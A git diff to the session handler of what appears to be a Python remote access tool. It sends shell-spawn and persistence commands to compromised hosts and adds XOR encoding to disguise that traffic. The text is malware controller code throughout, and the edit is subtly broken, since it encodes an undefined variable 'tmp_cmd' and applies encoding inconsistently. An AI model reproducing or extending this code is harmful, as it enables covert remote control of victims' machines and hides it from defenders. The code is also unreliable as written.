@@ -9,6 +9,7 @@
 from colorama import Fore,Style
 
 from .other import printColor
+from .other import XOREncryption
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
@@ -68,7 +69,10 @@ class Session:
             else:
                 cmd += char
 
-        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd.encode())): #send data
+        cmd_XOR = XOREncryption(tmp_cmd)
+        printColor("information","go send XOR cmd.{}".format(cmd_XOR))
+        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd_XOR.encode())): #send data
+            print("SEND")
             printColor("successfully",CheckConn().recvcommand(self.socket,4096).decode("utf8","replace"))
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
@@ -80,7 +84,7 @@ class Session:
         printColor("help","\n[?] Execute -b or --back to return to sessions mode.\n") 
         #printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
         
-        if(CheckConn().sendsafe(self.session_nb, self.socket, ("MOD_SPAWN_SHELL:"+prog).encode() ) ):
+        if(CheckConn().sendsafe(self.session_nb, self.socket, XOREncryption(("MOD_SPAWN_SHELL:"+prog)).encode() ) ):
             FakeCmd(self.socket).main() #Run cmd
         
         else:
@@ -90,7 +94,7 @@ class Session:
         '''-p or --persistence'''
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
         mod_persi = "MOD_LONELY_PERSISTENCE:default"
-        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
+        if(CheckConn().sendsafe(self.session_nb, self.socket, XOREncryption(mod_persi.encode()))): #send mod persi
             #printColor("information","[+] the persistence mod was sent.\n")
             
             reponse = CheckConn().recvsafe(self.socket,4096).decode("utf-8","replace")
